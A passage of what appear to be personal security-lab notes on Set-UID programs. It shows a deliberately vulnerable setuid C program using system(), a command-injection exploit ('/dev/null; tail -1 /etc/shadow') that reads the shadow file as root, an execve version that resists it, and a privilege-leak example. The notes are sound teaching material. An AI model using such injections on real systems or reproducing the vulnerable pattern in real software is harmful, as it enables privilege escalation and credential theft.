+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+  char *v[3];
+  char *command;
+
+  if (argc &lt; 2) {
+    printf(&quot;please type a file name.\n&quot;);
+    return 1;
+  }
+
+  v[0] = &quot;/bin/cat&quot;;
+  v[1] = argv[1];
+  v[2] = NULL;
+  command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
+  sprintf(command, &quot;%s %s&quot;, v[0], v[1]);
+
+  /* use only one of the following */
+  system(command);
+  // execve(v[0], v, NULL);
+  return 0;
+}
+</code></pre><p>exploiting <code>myexec.c</code>, assuming it has setuid enabled</p><pre class="bash highlight" dir=(org-attach-dir) data-exports=both><code># temporarily change /bin/sh to /bin/zsh for the exploit to work
+sudo ln -sf /bin/zsh /bin/sh
+
+# compile program
+gcc -o myexec myexec.c
+sudo chown root myexec
+sudo chmod u+s myexec
+
+# run exploit
+./myexec &#39;/dev/null; tail -1 /etc/shadow&#39;
+
+# restore dash cuz i dont want my script to be slow
+sudo ln -sf /bin/dash /bin/sh
+</code></pre><pre class="example highlight"><code>mahmooz2:!:19587:0:99999:7:::
+</code></pre><p>testing it with <code>execve</code>:</p><pre class="c highlight" data-org-language=C data-tangle='(format "%s/myexec2.c" (org-attach-dir))' data-eval=no><code>#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+  char *v[3];
+  char *command;
+
+  if (argc &lt; 2) {
+    printf(&quot;please type a file name.\n&quot;);
+    return 1;
+  }
+
+  v[0] = &quot;/bin/cat&quot;;
+  v[1] = argv[1];
+  v[2] = NULL;
+  command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
+  sprintf(command, &quot;%s %s&quot;, v[0], v[1]);
+
+  /* use only one of the following */
+  /* system(command); */
+  execve(v[0], v, NULL);
+  return 0;
+}
+</code></pre><p>running the exploit:</p><pre class="bash highlight" dir=(org-attach-dir) data-exports=both><code># temporarily change /bin/sh to /bin/zsh for the exploit to work
+sudo ln -sf /bin/zsh /bin/sh
+
+# compile program
+gcc -o myexec2 myexec2.c
+sudo chown root myexec2
+sudo chmod u+s myexec2
+
+# run exploit
+./myexec2 &#39;/dev/null; tail -1 /etc/shadow&#39;
+
+# restore dash cuz i dont want my script to be slow
+sudo ln -sf /bin/dash /bin/sh
+</code></pre><p>we get:</p><pre class="example highlight"><code>/bin/cat: &#39;/dev/null; tail -1 /etc/shadow&#39;: No such file or directory
+[ Babel evaluation exited with code 0 ]
+</code></pre><p>this happens because <code>execve</code> doesnt use a shell to execute the command with the argument we passed to it, but executes it itself, it would be the same as running <code>/bin/cat '/dev/null; tail -1 /etc/shadow'</code>, here, <code>/dev/null; tail -1 /etc/shadow</code> isnt interpreted as part of the shell command but as an argument to pass to <code>/bin/cat</code></p><h1 id=privilege-leakage>privilege leakage</h1><pre class="c highlight" data-org-language=C data-eval=no data-tangle='(format "%s/leak.c" (org-attach-dir))'><code>  #include &lt;unistd.h&gt;
+  #include &lt;stdio.h&gt;
+  #include &lt;stdlib.h&gt;
+  #include &lt;string.h&gt;
+  #include &lt;fcntl.h&gt;
+
+  int main() {
+    int fd;
+    char *v[2];
+/* assume that /etc/zzz is an important systme file,
+       and it is owned by root with permission 0664.
+       before running this program, you should create
+       the file /etc/zzz first. */
+    fd = open(&quot;/etc/zzz&quot;, O_RDWR | O_APPEND);
+    if (fd == -1) {
+      printf(&quot;cannot open /etc/zzz\n&quot;);
+      exit(0);
+    }
+
+    // print out the file descriptor value
+    printf(&quot;fd is %d\n&quot;, fd);
+    // permanently disable the privilege by making the
+    // effective uid the same as the real uid
+    setuid(getuid());
+
+    // execute /bin/sh
+    v[0] = &quot;/bin/sh&quot;; v[1] = 0;
+    execve(v[0], v, 0);
+  }
+</code></pre><p>exploiting <code>leak.c</code>:
+<img src=/Tue_Aug_29_10:22:21_PM_IDT_2023.png class=figure></p></div></main></body></html>
